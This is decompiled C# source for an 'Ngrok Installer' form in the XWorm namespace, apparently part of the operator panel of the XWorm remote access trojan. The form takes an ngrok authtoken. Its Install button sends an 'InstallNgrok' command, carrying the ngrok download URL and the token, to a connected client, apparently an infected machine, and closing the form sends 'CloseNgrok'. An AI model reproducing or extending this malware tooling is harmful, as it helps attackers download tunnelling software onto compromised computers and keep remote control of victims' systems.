#define DEBUG
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;

namespace XWorm;

[DesignerGenerated]
public class ngrok : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	private System.Windows.Forms.Timer _Timer1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton1")]
	private Guna2GradientButton _Guna2GradientButton1;

	public GClass5 gclass5_0;

	[field: AccessedThroughProperty("Label1")]
	public Label Label1
	;

	[field: AccessedThroughProperty("StatusStrip1")]
	public StatusStrip StatusStrip1
	;

	[field: AccessedThroughProperty("ToolStripStatusLabel1")]
	public ToolStripStatusLabel ToolStripStatusLabel1
	;
	public System.Windows.Forms.Timer Timer1
	;

	[field: AccessedThroughProperty("Guna2TextBox1")]
	public Guna2TextBox Guna2TextBox1
	;
	public Guna2GradientButton Guna2GradientButton1
	;

	public ngrok()
	{
		base.FormClosing += ngrok_FormClosing;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(XWorm.ngrok));
		this.Label1 = new System.Windows.Forms.Label();
		this.StatusStrip1 = new System.Windows.Forms.StatusStrip();
		this.ToolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
		this.Timer1 = new System.Windows.Forms.Timer(this.components);
		this.Guna2TextBox1 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Guna2GradientButton1 = new Guna.UI2.WinForms.Guna2GradientButton();
		this.StatusStrip1.SuspendLayout();
		base.SuspendLayout();
		this.Timer1.Tick += new System.EventHandler(Timer1_Tick);
		this.Guna2GradientButton1.Click += new System.EventHandler(Guna2GradientButton1_Click);
		this.Label1.AutoSize = true;
		this.Label1.ForeColor = System.Drawing.Color.Black;
		this.Label1.Location = new System.Drawing.Point(15, 23);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(64, 13);
		this.Label1.TabIndex = 0;
		this.Label1.Text = "Authtoken :";
		this.StatusStrip1.BackColor = System.Drawing.Color.White;
		this.StatusStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.StatusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.ToolStripStatusLabel1 });
		this.StatusStrip1.Location = new System.Drawing.Point(0, 83);
		this.StatusStrip1.Name = "StatusStrip1";
		this.StatusStrip1.Padding = new System.Windows.Forms.Padding(1, 0, 9, 0);
		this.StatusStrip1.Size = new System.Drawing.Size(357, 22);
		this.StatusStrip1.TabIndex = 9;
		this.StatusStrip1.Text = "StatusStrip1";
		this.ToolStripStatusLabel1.ForeColor = System.Drawing.Color.Black;
		this.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1";
		this.ToolStripStatusLabel1.Size = new System.Drawing.Size(13, 17);
		this.ToolStripStatusLabel1.Text = "..";
		this.Timer1.Enabled = true;
		this.Timer1.Interval = 1000;
		this.Guna2TextBox1.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox1.BorderRadius = 3;
		this.Guna2TextBox1.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox1.DefaultText = "Your_Authtoken";
		this.Guna2TextBox1.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox1.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox1.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox1.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox1.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox1.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox1.Location = new System.Drawing.Point(85, 20);
		this.Guna2TextBox1.Name = "Guna2TextBox1";
		this.Guna2TextBox1.PasswordChar = '\0';
		this.Guna2TextBox1.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox1.PlaceholderText = "";
		this.Guna2TextBox1.SelectedText = "";
		this.Guna2TextBox1.Size = new System.Drawing.Size(257, 21);
		this.Guna2TextBox1.TabIndex = 97;
		this.Guna2GradientButton1.BorderRadius = 4;
		this.Guna2GradientButton1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton1.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton1.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton1.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton1.Image = (System.Drawing.Image)resources.GetObject("Guna2GradientButton1.Image");
		this.Guna2GradientButton1.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
		this.Guna2GradientButton1.ImageSize = new System.Drawing.Size(17, 17);
		this.Guna2GradientButton1.Location = new System.Drawing.Point(85, 47);
		this.Guna2GradientButton1.Name = "Guna2GradientButton1";
		this.Guna2GradientButton1.Size = new System.Drawing.Size(257, 24);
		this.Guna2GradientButton1.TabIndex = 98;
		this.Guna2GradientButton1.Text = "Install";
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(357, 105);
		base.Controls.Add(this.Guna2GradientButton1);
		base.Controls.Add(this.Guna2TextBox1);
		base.Controls.Add(this.Label1);
		base.Controls.Add(this.StatusStrip1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "ngrok";
		this.Text = "Ngrok Installer";
		this.StatusStrip1.ResumeLayout(false);
		this.StatusStrip1.PerformLayout();
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!gclass5_0.bool_0)
			{
				Close();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Guna2GradientButton1_Click(object sender, EventArgs e)
	{
		try
		{
			string text = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-386.zip";
			string text2 = Guna2TextBox1.Text;
			byte[] array = Module0.smethod_6("InstallNgrok" + GClass19.string_0 + text + GClass19.string_0 + text2);
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void ngrok_FormClosing(object sender, FormClosingEventArgs e)
	{
		byte[] array = Module0.smethod_6("CloseNgrok");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
		}, array);
	}
}